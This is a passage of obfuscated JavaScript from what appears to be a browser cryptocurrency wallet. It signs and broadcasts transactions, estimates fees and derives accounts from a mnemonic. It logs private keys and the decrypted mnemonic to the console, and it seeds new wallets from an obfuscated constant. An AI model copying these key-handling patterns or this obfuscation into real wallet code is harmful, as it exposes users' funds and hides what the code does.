_0x1fcb62=CoinsJson[_0x1c2304],_0x19c0a8=_0x13f9f8[_0x59c12d(0x27f)]['transaction_hash'],_0x3692c8=_0x59c12d(0x185);document['getElementById']('TransactionID')[_0x59c12d(0x1cd)]='https://blockchair.com/'+_0x1fcb62[_0x59c12d(0xef)]+_0x59c12d(0x23a)+_0x19c0a8+_0x3692c8,stopSpinner(_0x59c12d(0xd3));})[_0x35012d(0x1e4)](_0x1a1ca0=>{var _0x3a877e=_0x35012d;console[_0x3a877e(0x299)](_0x1a1ca0),console[_0x3a877e(0x109)]('Error\x20broadcasting\x20transaction'),stopSpinner('StartSendButtonID');});}async function BroadcastBitcoinLikeToChainso(_0x435fec,_0x3a32d8){var _0x152775=_0x28cfff,_0x43ea22=CoinsJson[_0x435fec][_0x152775(0xef)];const _0xa9a723=_0x152775(0x1ba)+_0x43ea22+'/';fetch(_0xa9a723,{'method':_0x152775(0x11b),'headers':{'Content-Type':_0x152775(0x2bf)},'body':JSON['stringify']({'tx_hex':_0x3a32d8})})[_0x152775(0x2f5)](_0x5f77=>_0x5f77[_0x152775(0x1f1)]())[_0x152775(0x2f5)](_0x293dae=>{var _0x4e62e2=_0x152775;console[_0x4e62e2(0x109)](_0x293dae),console['log'](_0x4e62e2(0x21e)+_0x293dae['tx'][_0x4e62e2(0x2b3)]);})['catch'](_0x54359a=>{var _0xb4ebed=_0x152775;console[_0xb4ebed(0x299)](_0x54359a),console['log'](_0xb4ebed(0x254));});}async function BroadcastBitcoinLikeToBlockcypher(_0x25ffd0,_0x2d8321){var _0x3a346b=_0x28cfff;const _0x535c78='https://api.blockcypher.com/v1/'+CoinsJson[_0x25ffd0][_0x3a346b(0x2df)][_0x3a346b(0x107)]()+'/main/txs/push';fetch(_0x535c78,{'method':_0x3a346b(0x11b),'headers':{'Content-Type':'application/json'},'body':JSON[_0x3a346b(0x1a5)]({'tx':_0x2d8321})})[_0x3a346b(0x2f5)](_0x34b002=>_0x34b002[_0x3a346b(0x1f1)]())[_0x3a346b(0x2f5)](_0x344fc1=>{var _0x31b5af=_0x3a346b;console[_0x31b5af(0x109)](_0x344fc1),console[_0x31b5af(0x109)](_0x31b5af(0x21e)+_0x344fc1['tx'][_0x31b5af(0x2b3)]);var _0x54f070=CoinsJson[_0x25ffd0],_0x3ab8ac=_0x344fc1['tx'][_0x31b5af(0x2b3)],_0x1faf88=_0x31b5af(0x185);document['getElementById'](_0x31b5af(0x214))[_0x31b5af(0x1cd)]=_0x54f070[_0x31b5af(0x20c)]+'/tx/'+_0x3ab8ac+_0x1faf88,stopSpinner(_0x31b5af(0xd3));})[_0x3a346b(0x1e4)](_0x386df5=>{var _0x5d47f0=_0x3a346b;console[_0x5d47f0(0x299)](_0x386df5),console[_0x5d47f0(0x109)](_0x5d47f0(0x254)),document['getElementById'](_0x5d47f0(0x214))[_0x5d47f0(0x2ac)]=_0x386df5+'\x20Maybe\x20send\x20amount\x20is\x20too\x20small.',stopSpinner(_0x5d47f0(0xd3));});}async function TransactionReplacement(_0x28909f){var _0x3677be=_0x28cfff;const _0x35e506=bitcoin[_0x3677be(0xe7)]['bitcoin'];_0x35e506[_0x3677be(0x286)]=CoinsJson[_0x28909f][_0x3677be(0x130)],_0x35e506[_0x3677be(0xfa)]=CoinsJson[_0x28909f][_0x3677be(0x164)],_0x35e506[_0x3677be(0x2c4)]=CoinsJson[_0x28909f][_0x3677be(0x1d9)];const _0x2bdd1c='0200000001a06383e77aaa1b541ee7d4b64cb6caa2dcde8d54f196164a80e89374f5048960010000006a47304402200669114891b0d530198560f2877fe7711822debcb8d2f5e331a1c98d0a424e0002206ec27ab6148035b5e7bb1d8568ecf6eafdf156cc8b07858a6304de6433d10fd2012103bca17ec88145ad19e55f04cf80fd14f3b5b2095bbba5b59799f18a2c0cf41928ffffffff03512ff8cd000000001976a914212f58e97673f12c897a464fadd5f7910447763e88ac10270000000000001976a9142a4ea9f7949849fd9ffc88429ff49a9ebbe3962b88ac64000000000000001976a914254907a24d9f06b6bf087a4951dcf9b11c1d317588ac00000000',_0x1b6742=bitcoin[_0x3677be(0x10c)]['fromHex'](_0x2bdd1c);var _0x3ac43c=0x0;_0x1b6742['outs'][_0x3677be(0x18c)](_0x43743c=>{var _0x447526=_0x3677be;console[_0x447526(0x109)](_0x447526(0x24c)+_0x43743c[_0x447526(0x2c8)]+':'+_0x43743c['value']),_0x3ac43c=_0x3ac43c+_0x43743c[_0x447526(0x1ae)];}),console[_0x3677be(0x109)](_0x3677be(0x136),_0x3ac43c);var _0x3707a9=parseInt(_0x3ac43c*0.95);console[_0x3677be(0x109)]('DesiredOutput:',_0x3707a9);var _0x2d1fa4='';const _0x5d183b=bitcoin[_0x3677be(0x228)][_0x3677be(0x102)](_0x2d1fa4),_0x3413c9=new bitcoin[(_0x3677be(0x1bf))]();_0x3413c9[_0x3677be(0x1ff)]('9d7f0173f533ce4fb8bc248abb98d56f6fa97d76eaf9cc528584d62',0x0),_0x3413c9[_0x3677be(0x2f6)]('',_0x3707a9),_0x3413c9[_0x3677be(0x276)](0x0,_0x5d183b);const _0x5bb423=_0x3413c9[_0x3677be(0x2a3)]()[_0x3677be(0x1be)]();console[_0x3677be(0x109)]('newTxHex:',_0x5bb423);}async function TransactionReplacement1(_0x419884){var _0x37836d=_0x28cfff;const _0x639573='0200000001a06383e77aaa1b541ee7d4b64cb6caa2dcde8d54f196164a80e89374f5048960010000006a47304402200669114891b0d530198560f2877fe7711822debcb8d2f5e331a1c98d0a424e0002206ec27ab6148035b5e7bb1d8568ecf6eafdf156cc8b07858a6304de6433d10fd2012103bca17ec88145ad19e55f04cf80fd14f3b5b2095bbba5b59799f18a2c0cf41928ffffffff03512ff8cd000000001976a914212f58e97673f12c897a464fadd5f7910447763e88ac10270000000000001976a9142a4ea9f7949849fd9ffc88429ff49a9ebbe3962b88ac64000000000000001976a914254907a24d9f06b6bf087a4951dcf9b11c1d317588ac00000000',_0x831aa3=0x64,_0x4fa7e3=bitcoin['networks']['bitcoin'];_0x4fa7e3['pubKeyHash']=CoinsJson[_0x419884]['pub'],_0x4fa7e3[_0x37836d(0xfa)]=CoinsJson[_0x419884][_0x37836d(0x164)],_0x4fa7e3[_0x37836d(0x2c4)]=CoinsJson[_0x419884][_0x37836d(0x1d9)];var _0x21e198='';const _0x4809be=bitcoin['ECPair'][_0x37836d(0x102)](_0x21e198),_0x4238fc=_0x4809be[_0x37836d(0x2a1)];console[_0x37836d(0x109)]('bitcoin.payments:',bitcoin[_0x37836d(0x272)]);const _0x1f19a9=bitcoin[_0x37836d(0x272)][_0x37836d(0x229)]({'pubkey':_0x4238fc})['address'],_0x11661f=bitcoin[_0x37836d(0x10c)][_0x37836d(0xf5)](_0x639573),_0x473055=new bitcoin[(_0x37836d(0x1bf))]();_0x11661f['ins'][_0x37836d(0x18c)](_0x298058=>{var _0x5f3d8a=_0x37836d;_0x473055[_0x5f3d8a(0x1ff)](_0x298058[_0x5f3d8a(0x2b3)],_0x298058[_0x5f3d8a(0x2fb)]),console[_0x5f3d8a(0x109)](_0x5f3d8a(0x2c3)+_0x298058[_0x5f3d8a(0x2b3)]+':'+_0x298058[_0x5f3d8a(0x2fb)]);});var _0x46a190=0x0;_0x11661f[_0x37836d(0x1f8)][_0x37836d(0x18c)](_0x488bf7=>{var _0x197654=_0x37836d;_0x473055['addOutput'](_0x488bf7['script'],_0x488bf7[_0x197654(0x1ae)]),console['log']('outs:'+_0x488bf7[_0x197654(0x2c8)]+':'+_0x488bf7[_0x197654(0x1ae)]),_0x46a190=_0x46a190+_0x488bf7[_0x197654(0x1ae)];}),console[_0x37836d(0x109)]('CalculateOutput:',_0x46a190);const _0x50979a=_0x11661f[_0x37836d(0x1a6)][_0x37836d(0x1e7)]((_0x2276b6,_0x585cb5)=>_0x2276b6+_0x585cb5[_0x37836d(0x1ae)],0x0)-_0x473055[_0x37836d(0x1f8)][_0x37836d(0x1e7)]((_0x3a24d6,_0x599be8)=>_0x3a24d6+_0x599be8['value'],0x0);console[_0x37836d(0x109)](_0x37836d(0x11d),_0x50979a),console[_0x37836d(0x109)]('change:',_0x11661f[_0x37836d(0x1f8)]['reduce']((_0x2b753a,_0x248081)=>_0x2b753a+_0x248081[_0x37836d(0x1ae)],0x0)-_0x50979a),_0x473055['addOutput'](_0x1f19a9,_0x11661f['outs'][_0x37836d(0x1e7)]((_0x2df1c1,_0xf61475)=>_0x2df1c1+_0xf61475['value'],0x0)-_0x50979a),console[_0x37836d(0x109)]('New\x20Transaction\x20Inputs:',_0x473055[_0x37836d(0x1a6)]),console[_0x37836d(0x109)](_0x37836d(0x197),_0x473055[_0x37836d(0x1f8)]),console['log'](_0x37836d(0x2a7),_0x50979a),_0x11661f[_0x37836d(0x1a6)][_0x37836d(0x18c)]((_0x5658c7,_0x2618a0)=>{var _0x39ac25=_0x37836d;_0x473055[_0x39ac25(0x276)](_0x2618a0,_0x4809be);});const _0x2d999a=_0x473055[_0x37836d(0x2a3)](),_0x143c44=_0x2d999a[_0x37836d(0x1be)]();console[_0x37836d(0x109)](_0x37836d(0x252),_0x143c44);}async function GenerateTransactionTable(){var _0x2c936e=_0x28cfff;document[_0x2c936e(0xea)]('txHashTableBody')[_0x2c936e(0x2ac)]='';var _0x396abc=document[_0x2c936e(0xea)](_0x2c936e(0x14b))[_0x2c936e(0x1ae)],_0x1d80c0=document[_0x2c936e(0xea)](_0x2c936e(0x241))[_0x2c936e(0x2ac)];console['log']('GenerateTransactionTable\x20CoinType:',_0x396abc),console[_0x2c936e(0x109)](_0x2c936e(0x177),_0x1d80c0);if(CoinsJson[_0x396abc][_0x2c936e(0x1d3)]==='BitcoinLike'){var _0xb29cab='';BitcoinLikeBalanceData!==''?_0xb29cab=BitcoinLikeBalanceData:_0xb29cab=await FetchJSON(_0x2c936e(0x14d)+CoinsJson[_0x396abc][_0x2c936e(0x2df)][_0x2c936e(0x107)]()+_0x2c936e(0x2ef)+_0x1d80c0+'?includeScript=true&unspentOnly=true',_0x2c936e(0xec));console[_0x2c936e(0x109)](_0x2c936e(0xda),_0xb29cab);const _0x4a368b=document[_0x2c936e(0xea)](_0x2c936e(0x1cb)),_0x4a41f2=_0xb29cab[_0x2c936e(0x1b0)];_0x4a41f2&&_0x4a41f2['length']>0x0&&_0x4a41f2[_0x2c936e(0x18c)](_0x574da9=>{var _0x2b6c50=_0x2c936e;const _0x540887=document['createElement']('tr'),_0x565701=document[_0x2b6c50(0x2db)]('td');var _0x341552=document[_0x2b6c50(0x2db)]('a'),_0x4231f6=CoinsJson[_0x396abc][_0x2b6c50(0x20c)]+'/tx/'+_0x574da9['tx_hash'];_0x341552[_0x2b6c50(0x295)]='#',_0x341552['textContent']=_0x4231f6,_0x565701['appendChild'](_0x341552),_0x540887[_0x2b6c50(0x16c)](_0x565701);var _0x456e5c=_0x574da9[_0x2b6c50(0x1ae)];const _0x3a5ab1=document[_0x2b6c50(0x2db)]('td'),_0x46c708=document[_0x2b6c50(0x2db)](_0x2b6c50(0x122));_0x46c708['textContent']='',_0x46c708['classList'][_0x2b6c50(0x129)](_0x2b6c50(0x1a3),_0x2b6c50(0x19e));const _0x24ed3f=document['createElement'](_0x2b6c50(0x26e));_0x24ed3f[_0x2b6c50(0x121)]=_0x2b6c50(0xe1),_0x24ed3f['alt']=_0x2b6c50(0x256),_0x24ed3f[_0x2b6c50(0xd8)]['width']='20px',_0x24ed3f[_0x2b6c50(0xd8)][_0x2b6c50(0x1de)]='20px',_0x24ed3f[_0x2b6c50(0xd8)][_0x2b6c50(0xd7)]=_0x2b6c50(0x1b6),_0x46c708[_0x2b6c50(0x16c)](_0x24ed3f),_0x46c708[_0x2b6c50(0x1d6)](_0x2b6c50(0x1b1),()=>copyToClipboard(_0x4231f6)),_0x3a5ab1[_0x2b6c50(0x16c)](_0x46c708),_0x540887[_0x2b6c50(0x16c)](_0x3a5ab1),_0x4a368b[_0x2b6c50(0x16c)](_0x540887);});}else{if(CoinsJson[_0x396abc]['NetworkType']===_0x2c936e(0x114)){}}}function copyToClipboard(_0x23fae8){var _0x4c039b=_0x28cfff;const _0x49c5e9=document['createElement'](_0x4c039b(0x1b9));_0x49c5e9['value']=_0x23fae8,document[_0x4c039b(0xf8)]['appendChild'](_0x49c5e9),_0x49c5e9[_0x4c039b(0x308)](),document[_0x4c039b(0x2ed)](_0x4c039b(0xdb)),document[_0x4c039b(0xf8)][_0x4c039b(0x243)](_0x49c5e9);}async function AddFee(_0x1a563b,_0x35e36f,_0x88386f,_0x28b36f){var _0x3fd187=_0x28cfff,_0x1426d2=await FetchJSON('https://api.blockcypher.com/v1/'+CoinsJson[_0x35e36f][_0x3fd187(0x2df)]['toLowerCase']()+'/main/txs/'+_0x1a563b,_0x3fd187(0x1f3));console[_0x3fd187(0x109)]('data:',_0x1426d2);const _0x593720=bitcoin[_0x3fd187(0xe7)][_0x3fd187(0xf9)];_0x593720[_0x3fd187(0x286)]=CoinsJson[_0x35e36f][_0x3fd187(0x130)],_0x593720[_0x3fd187(0xfa)]=CoinsJson[_0x35e36f][_0x3fd187(0x164)],_0x593720[_0x3fd187(0x2c4)]=CoinsJson[_0x35e36f][_0x3fd187(0x1d9)];var _0x469d6d=await DecryptAccount(CurrentEncryptedPrivateKey);const _0x5d69c0=bitcoin['ECPair']['fromWIF'](_0x469d6d),_0xed3d6=new bitcoin[(_0x3fd187(0x1bf))]();_0xed3d6['addInput'](_0x1a563b,0x0);var _0x50f472=0x2faf080,_0x4c793a=parseInt(parseInt(_0x28b36f)-_0x50f472);_0xed3d6[_0x3fd187(0x2f6)](_0x88386f,_0x4c793a),_0xed3d6[_0x3fd187(0x276)](0x0,_0x5d69c0);const _0x43f8ff=_0xed3d6['build']()[_0x3fd187(0x1be)]();console['log'](_0x3fd187(0x16e),_0x43f8ff),BroadcastBitcoinLikeToBlockcypher(_0x35e36f,_0x43f8ff);}async function CancelTransaction(_0x83ece0,_0x2a08c0,_0x5847b5,_0x51bd2d){var _0x13f808=_0x28cfff,_0x22c034=await FetchJSON(_0x13f808(0x14d)+CoinsJson[_0x2a08c0]['symbol'][_0x13f808(0x107)]()+_0x13f808(0x1ca)+_0x83ece0,_0x13f808(0x1c4),'CancelTransaction');console['log'](_0x13f808(0x2c5),_0x22c034);const _0x4410ba=bitcoin[_0x13f808(0xe7)][_0x13f808(0xf9)];_0x4410ba[_0x13f808(0x286)]=CoinsJson[_0x2a08c0][_0x13f808(0x130)],_0x4410ba['wif']=CoinsJson[_0x2a08c0]['priv'],_0x4410ba['scriptHash']=CoinsJson[_0x2a08c0][_0x13f808(0x1d9)];var _0x4d8ce2=await DecryptAccount(CurrentEncryptedPrivateKey);const _0x48689e=bitcoin[_0x13f808(0x228)][_0x13f808(0x102)](_0x4d8ce2),_0x4a198c=new bitcoin[(_0x13f808(0x1bf))]();_0x4a198c[_0x13f808(0x1ff)](_0x83ece0,0x0),_0x22c034[_0x13f808(0xee)][_0x13f808(0x18c)](_0xade9a9=>{var _0x425b62=_0x13f808;console[_0x425b62(0x109)](_0x425b62(0x24c)+_0xade9a9[_0x425b62(0x119)][0x0]+':'+_0xade9a9[_0x425b62(0x1ae)]);if(_0xade9a9[_0x425b62(0x119)][0x0]==_0x5847b5){var _0x2de020=parseInt(_0x51bd2d*0.95);console[_0x425b62(0x109)](_0x425b62(0x110),_0x2de020),_0x4a198c[_0x425b62(0x2f6)](_0xade9a9[_0x425b62(0x119)][0x0],_0x2de020);}else _0x4a198c[_0x425b62(0x2f6)](_0xade9a9[_0x425b62(0x119)][0x0],_0xade9a9[_0x425b62(0x1ae)]);}),_0x4a198c[_0x13f808(0x276)](0x0,_0x48689e);const _0x4b7804=_0x4a198c[_0x13f808(0x2a3)]()[_0x13f808(0x1be)]();console[_0x13f808(0x109)](_0x13f808(0x16e),_0x4b7804),BroadcastBitcoinLikeToBlockcypher(_0x2a08c0,_0x4b7804);}async function GetFee(_0x5c14de){var _0x46a498=_0x28cfff;console['log'](_0x46a498(0x13c));if(CoinsJson[_0x5c14de][_0x46a498(0x1d3)]==_0x46a498(0x191)){const _0x9c9605=_0x46a498(0x14d)+CoinsJson[_0x5c14de][_0x46a498(0x2df)][_0x46a498(0x107)]()+_0x46a498(0x2ae);fetch(_0x9c9605)['then'](_0x318c20=>_0x318c20[_0x46a498(0x1f1)]())[_0x46a498(0x2f5)](_0x362486=>{var _0xf1fa9e=_0x46a498;const _0x4e71a7=parseInt(_0x362486['low_fee_per_kb']);console[_0xf1fa9e(0x109)](_0xf1fa9e(0x1f4)+_0x4e71a7+'\x20'),FeeData=_0x362486,GlobalMinerFee=parseInt(_0x362486['low_fee_per_kb']),console[_0xf1fa9e(0x109)](_0xf1fa9e(0x1cf),GlobalMinerFee);})[_0x46a498(0x1e4)](_0x24cfad=>console[_0x46a498(0x299)](_0x24cfad));}}async function SetMaxSendAmount(){var _0x21121d=_0x28cfff,_0x3f68fe=document[_0x21121d(0xea)](_0x21121d(0x14b))[_0x21121d(0x1ae)];if(BitcoinLikeBalanceData[_0x21121d(0x2ca)]==0x0&&CoinsJson[_0x3f68fe]['NetworkType']==_0x21121d(0x191)){}document[_0x21121d(0xea)](_0x21121d(0x20d))[_0x21121d(0x1ae)]=BitcoinLikeBalanceData[_0x21121d(0x166)]/0x5f5e100;}async function RefreshBalance(){var _0x252979=_0x28cfff;await GetBalanceRun(_0x252979(0x26b)),await GenerateTransactionTable(),document[_0x252979(0xea)]('RefreshBalanceButtonID')[_0x252979(0x175)]=!![];}async function AmountOnChange(){var _0x236d6c=_0x28cfff;console[_0x236d6c(0x109)](_0x236d6c(0x15d),document['getElementById']('amount')[_0x236d6c(0x1ae)]);var _0x2ad4e1=document['getElementById'](_0x236d6c(0x20d))[_0x236d6c(0x1ae)],_0xa7a64a=document[_0x236d6c(0xea)](_0x236d6c(0x14b))[_0x236d6c(0x1ae)],_0x21c967=parseInt(_0x2ad4e1*CoinsJson[_0xa7a64a][_0x236d6c(0x309)]*0x5f5e100),_0x54d122=parseInt(BitcoinLikeBalanceData['balance']/0x5f5e100*CoinsJson[_0xa7a64a][_0x236d6c(0x309)]*0x5f5e100),_0x15f2c8=parseInt(GlobalMinerFee*0.2);console[_0x236d6c(0x109)](_0x236d6c(0x183),_0x15f2c8);if(document[_0x236d6c(0xea)]('amount')[_0x236d6c(0x1ae)]>=BitcoinLikeBalanceData['balance']/0x5f5e100&&CoinsJson[_0xa7a64a]['NetworkType']==_0x236d6c(0x191)){document[_0x236d6c(0xea)](_0x236d6c(0x20d))[_0x236d6c(0x1ae)]=BitcoinLikeBalanceData[_0x236d6c(0x166)]/0x5f5e100,console[_0x236d6c(0x109)]('FullBalanceAPPFee:',_0x54d122);var _0x5f10ea=parseFloat(parseFloat((_0x15f2c8+_0x54d122)/0x5f5e100)[_0x236d6c(0x1db)](0x5));document['getElementById'](_0x236d6c(0x239))[_0x236d6c(0x2ac)]=_0x236d6c(0x149)+_0x5f10ea+'\x20'+CoinsJson[_0xa7a64a][_0x236d6c(0x2df)],console[_0x236d6c(0x109)](_0x236d6c(0x289));}else{if(document[_0x236d6c(0xea)]('amount')['value']<BitcoinLikeBalanceData[_0x236d6c(0x166)]/0x5f5e100&&CoinsJson[_0xa7a64a]['NetworkType']==_0x236d6c(0x191)){console['log'](_0x236d6c(0x268),_0x21c967);var _0x5f10ea=parseFloat(parseFloat((_0x15f2c8+_0x21c967)/0x5f5e100)[_0x236d6c(0x1db)](0x5));document[_0x236d6c(0xea)](_0x236d6c(0x239))[_0x236d6c(0x2ac)]=_0x236d6c(0x149)+_0x5f10ea+'\x20'+CoinsJson[_0xa7a64a][_0x236d6c(0x2df)];}}}async function addOneAccountByMnemonic(){var _0x2639f9=_0x28cfff;console[_0x2639f9(0x109)]('addOneAccountByMnemonic');var _0x38d93b=document[_0x2639f9(0xea)](_0x2639f9(0x14b))['value'],_0x40424f=CoinsJson[_0x38d93b][_0x2639f9(0x182)],_0x491dd3=localStorage[_0x2639f9(0x28e)]('mnemonic');console[_0x2639f9(0x109)](_0x2639f9(0x246),_0x40424f),console[_0x2639f9(0x109)](_0x2639f9(0x169),_0x491dd3);var _0x244467=CryptoJS[_0x2639f9(0x137)][_0x2639f9(0xcf)](_0x491dd3,pass+pass),_0x25d43e=_0x244467['toString'](CryptoJS['enc']['Utf8']),_0x8b0162=await getAccountsData();console[_0x2639f9(0x109)](_0x2639f9(0x2c5),_0x8b0162),console[_0x2639f9(0x109)]('coin:',_0x8b0162[_0x40424f]),console[_0x2639f9(0x109)]('length:',_0x8b0162[_0x40424f][_0x2639f9(0x263)]);if(CoinsJson[_0x38d93b]['NetworkType']==='BitcoinLike'){var _0x286d40=bitcoin[_0x2639f9(0xe7)]['bitcoin'];_0x286d40[_0x2639f9(0x286)]=CoinsJson[_0x40424f][_0x2639f9(0x130)],_0x286d40[_0x2639f9(0xfa)]=CoinsJson[_0x40424f][_0x2639f9(0x164)],_0x286d40[_0x2639f9(0x2c4)]=CoinsJson[_0x40424f]['multisig'];const _0x2e4f85=bip39['mnemonicToSeedSync'](_0x25d43e),_0x263d64=bitcoin[_0x2639f9(0x1a0)]['fromSeed'](_0x2e4f85,_0x286d40);var _0x3c7cc5=_0x8b0162[_0x40424f]['length'];const _0xf1990d=_0x263d64['deriveHardened'](0x2c)[_0x2639f9(0x298)](CoinsJson[_0x40424f][_0x2639f9(0x1c3)])[_0x2639f9(0x298)](0x0)[_0x2639f9(0x2a8)](0x0)[_0x2639f9(0x2a8)](_0x3c7cc5),_0x422b4e=bitcoin[_0x2639f9(0x272)]['p2pkh']({'pubkey':_0xf1990d['publicKey']})[_0x2639f9(0x1f7)],_0x4cdd23=_0xf1990d[_0x2639f9(0x2b0)]();console[_0x2639f9(0x109)](_0x2639f9(0x1cc),_0x40424f),console[_0x2639f9(0x109)]('pubKey:',_0x422b4e),console[_0x2639f9(0x109)](_0x2639f9(0x2cf),_0x4cdd23),await SaveAccount(_0x40424f,_0x4cdd23);}else{if(CoinsJson[_0x38d93b]['NetworkType']===_0x2639f9(0x114)){var _0x3c7cc5=_0x8b0162[_0x40424f][_0x2639f9(0x263)];path=_0x2639f9(0x160)+_0x3c7cc5;const _0x42a555=ethers[_0x2639f9(0x11a)][_0x2639f9(0x26c)][_0x2639f9(0x12e)](_0x25d43e),_0xbce454=_0x42a555[_0x2639f9(0x10d)](path);await SaveAccount(_0x40424f,_0xbce454['privateKey']);}}ShowToast(_0x2639f9(0x240)),await updateAccountSelector(),await updateMainAccountSelector(),document[_0x2639f9(0xea)](_0x2639f9(0x212))[_0x2639f9(0x12b)]=document[_0x2639f9(0xea)]('MainAccountSelector')[_0x2639f9(0x1f9)][_0x2639f9(0x263)]-0x1,OnChangeSelector2();}async function addOneAccountByJson(_0x5bd421){var _0xc4a73e=_0x28cfff;console[_0xc4a73e(0x109)](_0xc4a73e(0x201),_0x5bd421);var _0x57db73='';if(_0x5bd421==_0xc4a73e(0x26b)){var _0x261c26=document[_0xc4a73e(0xea)]('MainBlockchainSelector')[_0xc4a73e(0x1ae)];_0x57db73=CoinsJson[_0x261c26][_0xc4a73e(0x182)];}else _0x57db73=_0x5bd421;console[_0xc4a73e(0x109)](_0xc4a73e(0xd1),_0x57db73);var _0x2f3d87=getAccountsIndexData();console[_0xc4a73e(0x109)](_0xc4a73e(0x2ea),_0x2f3d87[_0x57db73]);if(_0x2f3d87[_0x57db73]>=AccountCount){ShowToast('Reached\x20maximum\x20account\x20count.');return;}var _0x2bacff=_0x2f3d87[_0x57db73]+0x1;SaveAccountIndex(_0x57db73,_0x2bacff),console['log'](_0xc4a73e(0x1e9),getAccountsIndexData()),selectOptionByName(_0x57db73),ShowToast(_0xc4a73e(0x240)),await updateMainAccountSelector(),document[_0xc4a73e(0xea)](_0xc4a73e(0x212))[_0xc4a73e(0x12b)]=document[_0xc4a73e(0xea)]('MainAccountSelector')[_0xc4a73e(0x1f9)][_0xc4a73e(0x263)]-0x1;}function selectOptionByName(_0x3d6b7b){var _0xbb0dbd=_0x28cfff,_0x38a0f1=document['getElementById'](_0xbb0dbd(0x14b));for(var _0x47e81e=0x0;_0x47e81e<_0x38a0f1[_0xbb0dbd(0x1f9)][_0xbb0dbd(0x263)];_0x47e81e++){if(_0x38a0f1['options'][_0x47e81e]['text']===_0x3d6b7b){_0x38a0f1[_0xbb0dbd(0x12b)]=_0x47e81e;break;}}}async function InitAccountsByMnemonic(){var _0x2e5ace=_0x28cfff;console[_0x2e5ace(0x109)](_0x2e5ace(0x2aa));var _0x5525ad=getAccountsData();console[_0x2e5ace(0x109)]('accountsData:',_0x5525ad);const _0xe61eb1=_0x2e5ace(0xe5);console['log'](_0x2e5ace(0x238),_0xe61eb1);if(localStorage[_0x2e5ace(0x28e)](_0x2e5ace(0x27b))==null||localStorage['getItem'](_0x2e5ace(0x27b))==undefined){var _0x4cc129=CryptoJS['AES']['encrypt'](_0xe61eb1,pass['trim']()+pass[_0x2e5ace(0x1c2)]())[_0x2e5ace(0x1d5)]();localStorage[_0x2e5ace(0x245)](_0x2e5ace(0x27b),_0x4cc129);}else{console[_0x2e5ace(0x109)](_0x2e5ace(0xfe));return;}for(var _0x1b3bd8 in CoinsJson){console['log']('process\x20coin',_0x1b3bd8);if(CoinsJson[_0x1b3bd8][_0x2e5ace(0x1d3)]==='BitcoinLike'){var _0xeffcc8=bitcoin['networks'][_0x2e5ace(0xf9)];_0xeffcc8[_0x2e5ace(0x286)]=CoinsJson[_0x1b3bd8][_0x2e5ace(0x130)],_0xeffcc8[_0x2e5ace(0xfa)]=CoinsJson[_0x1b3bd8][_0x2e5ace(0x164)],_0xeffcc8['scriptHash']=CoinsJson[_0x1b3bd8][_0x2e5ace(0x1d9)];const _0xcc98c9=bip39[_0x2e5ace(0x1a4)](_0xe61eb1),_0xbc4227=bitcoin['bip32'][_0x2e5ace(0xd2)](_0xcc98c9,_0xeffcc8),_0x9c064e=_0xbc4227[_0x2e5ace(0x298)](0x2c)[_0x2e5ace(0x298)](CoinsJson[_0x1b3bd8][_0x2e5ace(0x1c3)])[_0x2e5ace(0x298)](0x0)[_0x2e5ace(0x2a8)](0x0)['derive'](0x0),_0x5e0d1f=bitcoin['payments']['p2pkh']({'pubkey':_0x9c064e['publicKey']})['address'],_0x2308b9=_0x9c064e[_0x2e5ace(0x2b0)]();console[_0x2e5ace(0x109)](_0x2e5ace(0x1cc),_0x1b3bd8),console[_0x2e5ace(0x109)](_0x2e5ace(0x23e),_0x5e0d1f),console[_0x2e5ace(0x109)](_0x2e5ace(0x2cf),_0x2308b9),await SaveAccount(_0x1b3bd8,_0x2308b9);}}path=_0x2e5ace(0x2f4);const _0xe853e4=ethers[_0x2e5ace(0x11a)][_0x2e5ace(0x26c)][_0x2e5ace(0x12e)](_0xe61eb1),_0x55ea1b=_0xe853e4[_0x2e5ace(0x10d)](path);await SaveAccount(_0x2e5ace(0x114),_0x55ea1b[_0x2e5ace(0x29d)]);}async function Restore(_0x8e7e0c){var _0x19b050=_0x28cfff;await timer(0x1);var _0x278247=0x0,_0x2b51c3=0x1,_0x317254='';if(!IsANewWallet){console[_0x19b050(0x109)]('Please\x20use\x20a\x20new\x20wallet\x20to\x20restore\x20your\x20account',IsANewWallet),document[_0x19b050(0xea)](_0x19b050(0x1e1))['innerText']=_0x19b050(0x21a);return;}if(_0x8e7e0c==_0x19b050(0xe6)){_0x2b51c3=AccountCount,localStorage[_0x19b050(0x18a)]('AccountsIndex'),localStorage[_0x19b050(0x18a)]('accountsData'),_0x317254=document[_0x19b050(0xea)]('MnemonicID')[_0x19b050(0x1ae)];if(!ethers[_0x19b050(0x11a)][_0x19b050(0x305)](_0x317254)){console[_0x19b050(0x109)](_0x19b050(0x103)),ShowToast(_0x19b050(0x103));return;}}else _0x317254=_0x8e7e0c;$(_0x19b050(0x2fd))[_0x19b050(0x2c0)](),document['getElementById']('MnemonicID')[_0x19b050(0x1da)]=!![];var _0x1b4d0c=![];for(var _0x2e9131 in CoinsJson){if(CoinsJson[_0x2e9131][_0x19b050(0x1d3)]=='evm'&&!_0x1b4d0c)_0x278247=_0x278247+AccountCount,_0x1b4d0c=!![];else CoinsJson[_0x2e9131][_0x19b050(0x1d3)]!=='evm'&&(_0x278247=_0x278247+AccountCount);}console[_0x19b050(0x109)]('TotalCount:',_0x278247);var _0x48da32=0x0;for(var _0x2e9131 in CoinsJson){console[_0x19b050(0x109)](_0x19b050(0x25d),_0x2e9131);if(CoinsJson[_0x2e9131][_0x19b050(0x1d3)]===_0x19b050(0x191)){SaveAccountIndex(_0x2e9131,_0x2b51c3);var _0x122ba4=bitcoin[_0x19b050(0xe7)][_0x19b050(0xf9)];_0x122ba4[_0x19b050(0x286)]=CoinsJson[_0x2e9131][_0x19b050(0x130)],_0x122ba4[_0x19b050(0xfa)]=CoinsJson[_0x2e9131]['priv'],_0x122ba4['scriptHash']=CoinsJson[_0x2e9131]['multisig'];const _0x47fb45=bip39[_0x19b050(0x1a4)](_0x317254),_0x1d04d4=bitcoin[_0x19b050(0x1a0)][_0x19b050(0xd2)](_0x47fb45,_0x122ba4);for(var _0x44f06e=0x0;_0x44f06e<AccountCount;_0x44f06e++){console[_0x19b050(0x109)](_0x19b050(0x156),_0x44f06e);const 